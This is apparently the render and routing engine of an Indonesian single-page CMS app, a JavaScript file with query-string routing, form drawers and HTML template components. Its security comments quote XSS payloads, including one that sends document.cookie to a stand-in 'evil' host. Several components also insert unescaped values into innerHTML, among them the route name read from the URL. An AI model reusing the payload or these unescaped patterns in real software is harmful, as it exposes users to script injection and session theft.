// ============================================================
// engine.js — Mesin render generik untuk aplikasi SPA (admin + publik).
// ============================================================
// PERUBAHAN ARSITEKTUR: repo ini (cms-app) sekarang dideploy sendiri
// sebagai static hosting biasa (mis. GitHub Pages), TERPISAH dari
// backend (cms-api). Hosting statis semacam ini tidak bisa melakukan
// rewrite path server-side, jadi SEMUA rute — admin (dashboard, editor,
// dst.) MAUPUN publik (beranda, profil CMS, artikel, yang dulu di-SSR
// oleh worker.js) — sekarang dibaca dari QUERY STRING, BUKAN dari path
// (`window.location.pathname`).
//
// Keuntungan praktis: karena path selalu tetap "/" (atau "/index.html"),
// host statis apa pun otomatis menyajikan file yang sama untuk semua
// rute tanpa perlu konfigurasi rewrite atau trik 404 apa pun — query
// string tidak pernah memengaruhi file mana yang dicari oleh server.
//
// Halaman didaftarkan lewat `web.routes[slug] = 'namaResolver'` (lihat
// pages/*.js) — resolver mengembalikan array blok { section, ...data }
// yang dirender oleh `ui.render()` lewat `components[section](data)`.
//
// SATU bentuk query string untuk SEMUA rute (lihat parseLocationParams /
// buildQueryString di bawah): query diisi SEGMEN mirip path, bukan
// pasangan key=value, supaya alamat enak dibaca & dibagikan:
//       cms.piawai.id/                          -> beranda
//       cms.piawai.id/?profile/<kodeCms>        -> profil CMS
//       cms.piawai.id/?user/<kodeCms>/<slug>    -> 1 artikel
//       cms.piawai.id/?dashboard                -> dasbor (admin)
//       cms.piawai.id/?editor/<idArtikel>       -> edit 1 artikel (admin)
// Rute admin ikut bentuk yang sama, bukan `?page=dashboard` seperti
// sebelumnya — tidak ada alasan teknis untuk membedakannya, dan satu
// aturan lebih mudah diingat daripada dua.
//
// Ini TETAP query string murni (path selalu "/"), jadi hosting statis
// mana pun tetap menyajikan index.html yang sama tanpa rewrite apa pun —
// hanya *isi* query-nya yang dibuat mirip path.
//
// Aturannya seragam: segmen pertama = nama rute (`page`), segmen
// berikutnya = nilai untuk ROUTE_PARAM_KEYS[page] secara berurutan.
// Satu-satunya pengecualian adalah ROUTE_PREFIX di bawah, untuk rute
// yang nama prefiks URL-nya sengaja beda dari nama rutenya.
//
// Format navigasi (backward-compatible dengan pemanggilan lama seperti
// `web.navigate('editor/' + id)`):
//   - string 'dashboard'            -> ?dashboard
//   - string 'editor/POST_ID'       -> ?editor/POST_ID
//   - string 'profile/kode-cms'     -> ?profile/kode-cms
//   - string 'artikel/kode/slug'    -> ?user/kode/slug
//   - object {page, ...params}      -> dipakai langsung sebagai query
// ============================================================

// Segmen setelah nama rute dipetakan ke nama param berikut, berurutan.
// Rute yang tidak terdaftar di sini = tidak punya parameter URL.
const ROUTE_PARAM_KEYS = {
    editor: ['id'],
    profile: ['user'],
    artikel: ['user', 'slug'],
    laman: ['slug'],   // halaman statis buatan admin — ?laman/<slug>
};

// Rute yang prefiks URL-nya BEDA dari nama rutenya. Dipakai hanya untuk
// `artikel`, supaya alamat artikel terbaca sebagai milik seorang user
// (`?user/wawan/judul`) alih-alih `?artikel/wawan/judul`. Selain yang
// terdaftar di sini, prefiks = nama rute itu sendiri.
// Rute `artikel-list` (daftar artikel semua penulis) mengambil prefiks
// `artikel` — itu kata yang paling wajar dibaca pengunjung di alamat
// (`?artikel`). Bentrokan dengan rute `artikel` (satu artikel) tidak
// terjadi justru karena rute itu sendiri sudah memakai prefiks `user`:
// tidak ada dua rute yang mengklaim prefiks yang sama.
const ROUTE_PREFIX = {
    artikel: 'user',
    'artikel-list': 'artikel',
};

const PREFIX_TO_PAGE = Object.fromEntries(
    Object.entries(ROUTE_PREFIX).map(([page, prefix]) => [prefix, page])
);

/** Ubah target navigasi (string legacy ATAU object) jadi object query params {page, ...}. */
function resolveNavParams(target) {
    if (target && typeof target === 'object') return target;
    if (typeof target !== 'string' || !target) return null;
    const [page, ...rest] = target.split('/');
    const keys = ROUTE_PARAM_KEYS[page] || ['id'];
    const params = { page };
    rest.forEach((val, i) => { if (keys[i]) params[keys[i]] = val; });
    return params;
}

/** Baca `window.location.search` saat ini jadi object params {page, ...}.
 *  Menerima bentuk segmen (?dashboard, ?editor/ID, ?user/kode/slug) DAN
 *  bentuk lama `?page=x&...`, supaya tautan/bookmark yang sudah terlanjur
 *  tersebar sebelum perubahan ini tetap terbuka di halaman yang benar. */
function parseLocationParams() {
    const raw = window.location.search.replace(/^\?/, '');
    if (!raw) return { page: 'home' };

    // Bentuk lama: ada '=' di segmen pertama (mis. "page=dashboard&id=1").
    if (raw.split('/')[0].includes('=')) {
        const sp = new URLSearchParams(raw);
        const params = Object.fromEntries(sp.entries());
        if (!params.page) params.page = 'home';
        return params;
    }

    const [prefix, ...segs] = raw.split('/');
    const page = PREFIX_TO_PAGE[prefix] || prefix;
    const params = { page };
    (ROUTE_PARAM_KEYS[page] || []).forEach((key, i) => {
        if (segs[i] !== undefined && segs[i] !== '') params[key] = decodeURIComponent(segs[i]);
    });
    return params;
}

/** Kebalikan dari parseLocationParams: params {page, ...} -> query string
 *  siap dipakai di href / pushState (termasuk tanda '?' di depan, atau
 *  string kosong untuk beranda). */
function buildQueryString(params) {
    const { page, ...rest } = params;
    if (!page || page === 'home') return '';

    const prefix = ROUTE_PREFIX[page] || page;
    const segs = (ROUTE_PARAM_KEYS[page] || [])
        .map(key => rest[key])
        .map(v => (v === undefined || v === null ? '' : encodeURIComponent(v)));

    // Buang segmen kosong di ekor supaya '?editor' (artikel baru) tidak
    // jadi '?editor/'.
    while (segs.length && segs[segs.length - 1] === '') segs.pop();

    return `?${[prefix, ...segs].join('/')}`;
}

const web = {
    routes: {},   // diisi oleh masing-masing pages/*.js, mis. web.routes.postingan = 'resolvePostingan'
    currentParams: {}, // query params rute yang sedang aktif — bisa dibaca resolver publik (lihat pages/public.js)

    gebi: (id) => document.getElementById(id),

    /** Bangun href untuk sebuah target navigasi (string legacy atau object),
     *  memakai aturan URL yang sama dengan pushState — supaya tidak ada
     *  tempat yang merakit URL sendiri dan bisa ikut berubah kalau format
     *  URL diubah lagi. Beranda jadi "/" (bukan string kosong) supaya
     *  atribut href tetap valid. */
    href: function (target) {
        return buildQueryString(resolveNavParams(target) || {}) || '/';
    },

    // ------------------------------------------------------------
    // FORM DRAWER — panel geser dari kanan, dipakai ulang oleh SEMUA
    // form tambah/edit (artikel, profil CMS, kelola CMS).
    // Markup statis ada di index.html (#formDrawerOverlay/#formDrawerPanel).
    // ------------------------------------------------------------
    openDrawer: function (cfg) {
        const overlay = this.gebi('formDrawerOverlay');
        const panel   = this.gebi('formDrawerPanel');
        const titleEl = this.gebi('formDrawerTitle');
        const bodyEl  = this.gebi('formDrawerBody');
        if (!overlay || !panel || !bodyEl || !cfg) return;

        titleEl.textContent = cfg.title || cfg.subtitle || 'Form';
        bodyEl.innerHTML = cfg.bodyHtml !== undefined ? cfg.bodyHtml : components.genericForm(cfg);

        overlay.classList.add('open');
        panel.classList.add('open');
        document.body.classList.add('drawer-lock');
        if (typeof svg?.di === 'function') svg.di();
    },

    closeDrawer: function () {
        this.gebi('formDrawerOverlay')?.classList.remove('open');
        this.gebi('formDrawerPanel')?.classList.remove('open');
        document.body.classList.remove('drawer-lock');
    },

    /** Jembatan generik: buka drawer langsung dari config form { title, fields, onSubmit, submitText }. */
    openFormFromPage: function (cfg, opts = {}) {
        if (!cfg || !cfg.fields) { alert(opts.title || 'Tidak dapat membuka form'); return; }
        this.openDrawer({ ...cfg, title: opts.title || cfg.title || cfg.subtitle });
    },

    // ------------------------------------------------------------
    // ROUTING — mirip versi MOOC: slug -> resolver di `web.routes`,
    // slug yang tidak terdaftar otomatis dibaca dari `pages[slug]` statis
    // (lihat resolveContent). Semua resolver di sini di-await karena
    // sebagian besar mengambil data lewat db.js (fetch async ke Worker API).
    // ------------------------------------------------------------
    navigate: async function (target) {
        this.closeDrawer();

        // [PERF] Guard anti race-condition: klik cepat antar-halaman bisa
        // membuat fetch dari navigasi LAMA baru selesai SETELAH navigasi BARU
        // sudah dimulai, lalu menimpa konten yang sudah benar dengan konten
        // dari rute lama ("kedip" balik ke halaman sebelumnya). Tiap panggilan
        // navigate() mendapat nomor urut sendiri; hanya panggilan TERBARU yang
        // boleh menulis ke DOM / history / title di akhir.
        const mySeq = ++this._navSeq;
        web.startProgress();

        // target bisa: undefined (baca dari URL saat ini, lihat
        // parseLocationParams), string legacy ("dashboard",
        // "editor/post_123", "artikel/kode/slug"), atau object
        // {page, ...params} langsung. Lihat resolveNavParams() di atas.
        let params = resolveNavParams(target);
        if (!params) params = parseLocationParams();
        const targetSlug = params.page;

        // PENTING: currentParams HARUS di-set SEBELUM resolver dipanggil.
        // Resolver halaman publik (resolveArtikel/resolveProfile di
        // pages/public.js) membaca web.currentParams.user & .slug secara
        // sinkron di baris pertamanya. Kalau baris ini ada di bawah (setelah
        // await resolver), resolver membaca params rute LAMA — atau {} kosong
        // pada load pertama — sehingga kode CMS jadi '' dan API menjawab
        // "CMS tidak ditemukan".
        // Race-condition tetap aman: navigasi lama yang selesai belakangan
        // keluar di guard mySeq di bawah dan tidak menimpa apa pun.
        this.currentParams = params;

        let pageData = [];
        const resolverName = this.routes[targetSlug];
        // Resolver bisa terdaftar sebagai web.resolveXxx (mis. auth.js) ATAU
        // sebagai `function resolveXxx(){}` biasa di pages/*.js (otomatis
        // jadi window.resolveXxx) — cek keduanya, jangan cuma `this`.
        const resolverFn = this[resolverName] || window[resolverName];

        try {
            if (typeof resolverFn === 'function') {
                // subParam dipertahankan untuk kompatibilitas resolver lama
                // (mis. resolveEditor(postId)) — resolver baru (halaman
                // publik) bisa juga baca web.currentParams langsung.
                const subParam = ROUTE_PARAM_KEYS[targetSlug] ? params[ROUTE_PARAM_KEYS[targetSlug][0]] : undefined;
                // Argumen ke-3 (params) dikirim eksplisit supaya resolver baru
                // tidak perlu bergantung pada state global web.currentParams.
                pageData = await Promise.resolve(resolverFn.call(this, subParam, targetSlug, params));
            } else {
                pageData = [{ section: 'titleHero', title: 'Halaman Tidak Ditemukan', description: `Rute <strong>${targetSlug}</strong> tidak dikenal.` }];
            }
        } catch (err) {
            console.error(err);
            pageData = [{ section: 'titleHero', title: 'Terjadi Kesalahan', description: err.message }];
        }

        // Navigasi lain sudah dimulai selagi resolver di atas menunggu fetch —
        // hasil ini sudah basi, jangan sentuh DOM/history/title sama sekali.
        if (mySeq !== this._navSeq) return false;

        await ui.render('content', pageData);
        web.finishProgress();

        if (target !== undefined) {
            const qs = buildQueryString(params);
            window.history.pushState({ params }, '', qs || window.location.pathname);
        }
        document.title = `Piawai | ${targetSlug.toUpperCase()}`;
        window.scrollTo(0, 0);
        if (typeof svg?.di === 'function') svg.di();

        web.gebi('navLinks')?.classList.remove('active');
        document.querySelectorAll('.nav-parent.open').forEach(el => el.classList.remove('open'));
        return false;
    },

    _navSeq: 0,

    // ------------------------------------------------------------
    // PROGRESS BAR — garis tipis di atas halaman selama navigasi masih
    // menunggu fetch data, supaya jeda terasa "sedang memuat" alih-alih
    // diam/kedip. Murni kosmetik, tidak menahan apa pun.
    // ------------------------------------------------------------
    _progressTimer: null,
    startProgress: function () {
        const bar = this.gebi('navProgress');
        if (!bar) return;
        clearTimeout(this._progressTimer);
        bar.classList.remove('done');
        bar.style.transition = 'none';
        bar.style.width = '0%';
        // Paksa reflow supaya transisi berikutnya dari 0% benar-benar animasi.
        void bar.offsetWidth;
        bar.style.transition = '';
        bar.classList.add('active');
        requestAnimationFrame(() => { bar.style.width = '80%'; });
    },
    finishProgress: function () {
        const bar = this.gebi('navProgress');
        if (!bar) return;
        bar.style.width = '100%';
        this._progressTimer = setTimeout(() => {
            bar.classList.remove('active');
            bar.classList.add('done');
        }, 150);
    },

    /** Buka/tutup submenu dropdown (dipakai lewat klik, terutama di mobile;
     *  di desktop dropdown juga terbuka lewat hover via CSS — lihat style.css). */
    toggleSubmenu: function (labelEl) {
        const parent = labelEl.closest('.nav-parent');
        if (!parent) return;
        const wasOpen = parent.classList.contains('open');
        document.querySelectorAll('.nav-parent.open').forEach(el => el.classList.remove('open'));
        if (!wasOpen) parent.classList.add('open');
    },

};

// ============================================================
// [SECURITY] Escaping HTML terpusat.
// ------------------------------------------------------------
// engine.js merender banyak nilai yang BERASAL DARI INPUT PENGGUNA
// (judul artikel, nama CMS, dsb — lihat pages/*.js) langsung lewat
// template string. Kalau nilai itu ditaruh ke DOM tanpa di-escape,
// isi seperti `<img src=x onerror=alert(1)>` akan DIEKSEKUSI sebagai
// HTML, bukan ditampilkan sebagai teks — ini yang disebut stored XSS.
// Semua tempat di file ini yang merender nilai dinamis WAJIB lewat
// escHtml() (untuk teks/isi tag) kecuali nilai tsb memang dimaksudkan
// sebagai HTML mentah dan sudah dikontrol oleh developer (mis. kolom
// "aksi" pada tabel — lihat renderTable().rawKeys di bawah).
// ============================================================
function escHtml(s) {
    return String(s ?? '').replace(/[&<>"']/g, c => ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
    }[c]));
}

// ============================================================
// COMPONENTS — komponen render (identik pola-nya dengan versi MOOC)
// ============================================================
const components = {

    lineRenderer: (lines = [], context = {}) => {
        const data = Array.isArray(lines) ? lines : [];
        let inCodeBlock = false;

        const handlers = {
            'form:': (val) => {
                if (val) {
                    try { const inlineCtx = JSON.parse(val); return components.genericForm(inlineCtx); }
                    catch (e) { return components.genericForm(context); }
                }
                return components.genericForm(context);
            },
            'link:': (val) => {
                const parts = val.split(':');
                return `<a href="javascript:void(0)" onclick="web.navigate('${parts.slice(1).join(':')}')" class="inline-link">${parts[0]} &raquo;</a>`;
            },
            'skill:': (val) => {
                const [percent, label, text] = val.split(':');
                return `<div class="skill-item">
                    <div class="skill-info"><strong>${label}</strong> ${text || ''} <small>(${percent})</small></div>
                    <div class="skill-track"><div class="skill-fill" style="width:${percent}"></div></div>
                </div>`;
            },
            'card:': (val) => {
                const [title, content] = val.split(':');
                return `<div class="info-card"><strong>${title}</strong><p>${content}</p></div>`;
            },
            'table:': (val) => {
                let dataTable = null;
                if (val) {
                    if (context[val] && Array.isArray(context[val])) dataTable = context[val];
                    else { try { const parsed = JSON.parse(val); if (Array.isArray(parsed)) dataTable = parsed; } catch (e) { return `<div class="info-card">⚠ Format tabel salah</div>`; } }
                }
                if (!dataTable?.length) return context.emptyText ? `<div class="info-card">${context.emptyText}</div>` : '';
                return components.renderTable(dataTable, context.tableOpts || {});
            },
            'badge:': (val) => `<span class="badge">${val}</span>`,
            '### ': (val) => `<h3>${val}</h3>`,
            '## ':  (val) => `<h2>${val}</h2>`,
            '---':  () => '<hr>',
        };

        const out = [];
        let cardBuffer = [];
        const flushCards = () => {
            if (!cardBuffer.length) return;
            out.push(`<div class="info-card-row">${cardBuffer.join('')}</div>`);
            cardBuffer = [];
        };

        data.forEach(line => {
            if (typeof line !== 'string') { out.push(String(line)); return; }
            if (line.trim().startsWith('```')) {
                flushCards();
                if (!inCodeBlock) { inCodeBlock = true; out.push('<pre class="sv-code"><code>'); }
                else { inCodeBlock = false; out.push('</code></pre>'); }
                return;
            }
            if (inCodeBlock) { out.push(line.replace(/</g, '&lt;').replace(/>/g, '&gt;') + '\n'); return; }

            let html = line.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');

            if (html.startsWith('card:')) {
                cardBuffer.push(handlers['card:'](html.replace('card:', '').trim()));
                return;
            }
            flushCards();

            for (const [key, handler] of Object.entries(handlers)) {
                if (html.startsWith(key)) { out.push(handler(html.replace(key, '').trim())); return; }
            }
            out.push(`<div>${html}</div>`);
        });
        flushCards();

        return out.join('');
    },

    /** Form generik: dipakai oleh drawer tambah/edit di semua halaman bisnis.
     *  Class CSS yang dipakai (a-row, a-label, dynamic-form) BENAR-BENAR ada
     *  di style.css (lihat .form-drawer-body .dynamic-form / .a-row / .a-label). */
    genericForm: (ctx) => {
        const fields = (ctx.fields || []).map(f => {
            // Field tipe 'raw' dipakai untuk menyisip HTML yang HARUS berada di
            // dalam <form> (mis. field captcha matematika — token & jawabannya
            // ditaruh sebagai hidden input di dalam form terdekat, jadi kalau
            // widgetnya ditaruh di luar <form>, form.querySelector(...) di JS
            // tidak akan pernah menemukan tokennya). Isinya HARUS HTML yang
            // sudah dirakit/dipercaya oleh developer, BUKAN nilai dari pengguna.
            if (f.type === 'raw') return f.html || '';

            const fid  = f.id ? `id="${f.id}"` : '';
            // [SECURITY] f.value SERING berasal dari data tersimpan yang
            // aslinya diketik pengguna (mis. judul artikel di editor.js).
            // Tanpa escHtml(), nilai seperti `"><script>...` bisa keluar
            // dari atribut value="..." dan menyuntik HTML/JS baru ke form
            // (stored XSS yang muncul lagi setiap kali form dibuka/diedit).
            const fval = escHtml(f.value !== undefined && f.value !== null ? String(f.value) : '');
            const req  = f.required ? 'required' : '';
            const ph   = f.placeholder ? `placeholder="${escHtml(f.placeholder)}"` : '';
            const maxlen = f.maxlength ? `maxlength="${Number(f.maxlength)}"` : '';

            if (f.type === 'hidden') return `<input type="hidden" ${fid} name="${f.name}" value="${fval}">`;

            const starMark = f.required ? ' <span style="color:var(--orange,#f90)">*</span>' : '';
            const label = f.label ? `<label class="a-label">${f.label}${starMark}</label>` : '';

            let input;
            const fname = f.name ? `name="${f.name}"` : '';

            if (f.type === 'select') {
                const opts = (f.options || []).map(o => {
                    const v   = typeof o === 'object' ? o.value : o;
                    const l   = typeof o === 'object' ? o.label : o;
                    const sel = String(fval) === escHtml(String(v)) ? 'selected' : '';
                    return `<option value="${escHtml(v)}" ${sel}>${escHtml(l)}</option>`;
                }).join('');
                input = `<select ${fid} ${fname} ${req}><option value="">— pilih —</option>${opts}</select>`;
            } else if (f.type === 'textarea') {
                input = `<textarea ${fid} ${fname} rows="${f.rows || 3}" ${ph} ${req} ${maxlen}>${fval}</textarea>`;
            } else {
                const step = f.type === 'number' ? `step="${f.step || 'any'}"` : '';
                const auto = f.autocomplete ? `autocomplete="${escHtml(f.autocomplete)}"` : '';
                input = `<input type="${f.type || 'text'}" ${fid} ${fname} value="${fval}" ${ph} ${req} ${step} ${maxlen} ${auto}>`;
            }
            return `<div class="a-row">${label}${input}</div>`;
        }).join('');

        const onSubmit  = ctx.onSubmit || "event.preventDefault();";
        const submitBtn = ctx.noSubmitBtn ? '' : `<button type="submit" class="slcBtn">${ctx.submitText || 'Simpan'}</button>`;

        return `<form class="${ctx.wrapClass || 'dynamic-form'}" onsubmit="${onSubmit}">
            ${fields}
            ${submitBtn}
        </form>`;
    },

    /** Blok HTML mentah yang sudah dirakit oleh resolver (mis. halaman publik
     *  di pages/public.js) — dipakai saat komponen generik lain tidak pas. */
    rawHtml: (d) => d.html || '',

    titleHero: (d) => `
        <div class="row page">
            <div class="artikel">
                <h1>${d.title}</h1>
                ${d.description ? `<p>${d.description}</p>` : ''}
            </div>
        </div>`,

    hero: (d) => {
        const media = d.img
            ? `<img src="${d.img}" alt="${d.title}" class="img-hero">`
            : d.imgClass
                ? `<i class="${d.imgClass} kanan img hero-icon"></i>`
                : '';
        // Tagline & deskripsi keduanya opsional (halaman buatan admin belum
        // tentu mengisi semuanya) — jangan tinggalkan em-dash menggantung
        // atau baris kosong kalau salah satunya tidak ada.
        const teks = [d.tagline ? `<em>${d.tagline}</em>` : '', d.description || '']
            .filter(Boolean).join(' &mdash; ');
        return `
            <div class="row page hero">
                <div class="col-2-3 artikel">
                    <h1>${d.title}</h1><br>
                    ${teks ? `${teks}<br><br>` : ''}
                    ${(d.badges || []).map(b => `<span class="badge">${b}</span>`).join(' ')}
                    <br><br>
                    ${d.cta ? `<a href="${web.href(d.cta.link)}" onclick="web.navigate('${d.cta.link}'); return false;" class="btn-cta">${d.cta.text}</a>` : ''}
                </div>
                <div class="col-1-3 artikel">${media}</div>
            </div>`;
    },

    features: (d) => `
        <div class="row gading">
            ${(d.items || []).map(item => `
                <div class="col-1-3 artikel">
                    <i class="${item.icon} simg"></i>
                    <span class="judul">${item.title}</span><br>
                    <p>${item.content}</p>
                    ${item.linkTarget ? `<a href="${web.href(item.linkTarget)}" onclick="web.navigate('${item.linkTarget}'); return false;">${item.linkText}</a>` : ''}
                </div>`).join('')}
        </div>`,

    article: (d) => `
        <div class="row page4">
            <div class="col-1-3 artikel">
                ${d.leftCol.subtitle ? `<h2>${d.leftCol.subtitle}</h2><hr>` : ''}
                ${components.lineRenderer(d.leftCol.lines || [], d.leftCol)}
            </div>
            <div class="col-2-3 artikel">
                ${d.rightCol.subtitle ? `<h2>${d.rightCol.subtitle}</h2><hr>` : ''}
                ${components.lineRenderer(d.rightCol.lines || [], d.rightCol)}
            </div>
        </div>`,

    /** Varian 'article' satu kolom lebar penuh — dipakai oleh semua halaman CRUD
     *  admin (daftar artikel, daftar CMS, dst. butuh lebar penuh untuk tabel). */
    articleFull: (d) => `
        <div class="row page4">
            <div class="col-1-1 artikel">
                ${d.subtitle ? `<h2>${d.subtitle}</h2><hr>` : ''}
                ${components.lineRenderer(d.lines || [], d)}
            </div>
        </div>`,

    /** Kartu statistik (KPI) — dipakai oleh dashboard. */
    statGrid: (d) => `
        <div class="row page4 artikel">
            <div class="stat-grid">
                ${(d.stats || []).map(s => `
                    <div class="stat-card">
                        <div class="stat-value">${s.value}</div>
                        <div class="stat-label">${s.label}</div>
                    </div>`).join('')}
            </div>
        </div>`,

    /** Bar chart SVG generik — dipakai oleh dashboard (mis. artikel terpopuler). */
    barChart: (d) => {
        const items  = d.items || [];
        const max    = Math.max(1, ...items.map(i => i.value));
        const barH = 28, gap = 10, leftW = 170, chartW = 380, topPad = 10;
        const height = items.length * (barH + gap) + topPad || (barH + topPad);

        const bars = items.map((it, i) => {
            const y = topPad + i * (barH + gap);
            const w = max ? (it.value / max) * chartW : 0;
            return `
                <text x="0" y="${y + barH / 2}" class="chart-label" text-anchor="start">${it.label}</text>
                <rect x="${leftW}" y="${y}" width="${w}" height="${barH}" class="chart-bar" rx="4"></rect>
                <text x="${leftW + w + 8}" y="${y + barH / 2}" class="chart-value">${it.value}</text>`;
        }).join('');

        return `
            <div class="row page4 artikel">
                <h3>${d.title || ''}</h3>
                <div class="chart-wrap">
                    ${items.length
                        ? `<svg class="chart-svg" viewBox="0 0 ${leftW + chartW + 60} ${height}">${bars}</svg>`
                        : '<p>Belum ada data untuk ditampilkan.</p>'}
                </div>
            </div>`;
    },

    /**
     * Tabel generik. Sel di-ESCAPE SECARA DEFAULT karena baris tabel di
     * seluruh app ini (lihat pages/cms.js, pages/postingan.js) berisi
     * data yang berasal dari input pengguna (nama CMS, judul artikel,
     * dst). Tanpa escaping, mis. sebuah CMS didaftarkan dengan nama
     * `<img src=x onerror=fetch('https://evil/x?c='+document.cookie)>`
     * akan DIEKSEKUSI di browser SIAPA PUN yang membuka tabel itu —
     * termasuk superadmin di halaman "Kelola CMS" (pages/cms.js), yang
     * sesinya paling berkuasa di aplikasi ini. Itu stored XSS yang
     * berujung pengambilalihan akun berprivilise tinggi.
     *
     * [SECURITY] Kolom yang MEMANG sengaja berisi HTML rakitan developer
     * sendiri (mis. kolom "aksi" berisi tombol Edit/Hapus) harus didaftar
     * eksplisit lewat opts.rawKeys — HANYA kolom itu yang dilewatkan
     * tanpa escaping. Jangan pernah menaruh nilai milik pengguna ke
     * dalam kolom yang ada di rawKeys.
     */
    renderTable: (dataTable, opts = {}) => {
        if (!dataTable?.length) return '';
        const allKeys  = Object.keys(dataTable[0]);
        const hidden   = new Set(opts.hiddenKeys || []);
        const keys     = opts.visibleKeys ? opts.visibleKeys.filter(k => !hidden.has(k)) : allKeys.filter(k => !hidden.has(k));
        const labels   = opts.labels || {};
        const rawKeys  = new Set(opts.rawKeys || []);

        const head = keys.map(k => `<th>${escHtml(labels[k] || k.toUpperCase())}</th>`).join('');
        const body = dataTable.map(row => `<tr>${keys.map(k => {
            const val = row[k] ?? '';
            return `<td>${rawKeys.has(k) ? val : escHtml(val)}</td>`;
        }).join('')}</tr>`).join('')
            || `<tr><td colspan="${keys.length}" style="text-align:center;color:var(--aColor)">Tidak ada data.</td></tr>`;

        return `<div class="table-container"><table>
            <thead><tr>${head}</tr></thead>
            <tbody>${body}</tbody>
        </table></div>`;
    },
};

// ============================================================
// UI — Render Engine
// ============================================================
const ui = {
    render: async (id, dataArray) => {
        const el = web.gebi(id);
        if (el && Array.isArray(dataArray)) {
            const rendered = await Promise.all(
                dataArray.map(d => Promise.resolve(components[d.section]?.(d) || ''))
            );
            // [PERF] Fade halus saat konten berganti: turunkan opacity sesaat
            // SEBELUM swap innerHTML, lalu naikkan lagi setelah swap. Ini beda
            // dari "loading spinner" — konten lama tidak hilang mendadak, dan
            // konten baru tidak "pop" tiba-tiba, jadi transisi terasa mulus
            // meski data sudah siap secepat mungkin (bukan animasi buatan yang
            // sengaja memperlambat).
            el.classList.add('content-fade-out');
            // Satu frame supaya browser sempat menerapkan opacity sebelum konten diganti.
            await new Promise(r => requestAnimationFrame(r));
            el.innerHTML = rendered.join('');
            el.classList.remove('content-fade-out');
        }
    },
};

// [PERF] Render pertama SENGAJA TIDAK dipicu dari 'load' di sini —
// event itu baru menyala setelah SEMUA resource halaman selesai (termasuk
// gambar, yang baru diketahui browser SETELAH konten di-render ke DOM —
// jadi 'load' juga menunggu gambar yang isinya sendiri baru muncul
// setelah render pertama, lingkaran yang bikin render tertunda lama
// tanpa alasan). Pemicu render pertama sekarang ada di callback
// loadPageScripts() (lihat index.html/app.html), langsung setelah semua
// modul halaman siap — konten tampil sesegera mungkin, gambar & aset
// lain menyusul di background tanpa menahan render.
window.addEventListener('popstate', () => web.navigate());

document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') web.closeDrawer?.();
});

document.addEventListener('click', (e) => {
    const burger = web.gebi('burgerBtn');
    const nav    = web.gebi('navLinks');
    if (burger?.contains(e.target)) {
        nav.classList.toggle('active');
        e.stopPropagation();
    } else if (nav?.classList.contains('active') && !nav.contains(e.target)) {
        nav.classList.remove('active');
    }

    if (!e.target.closest('.nav-parent')) {
        document.querySelectorAll('.nav-parent.open').forEach(el => el.classList.remove('open'));
    }
});
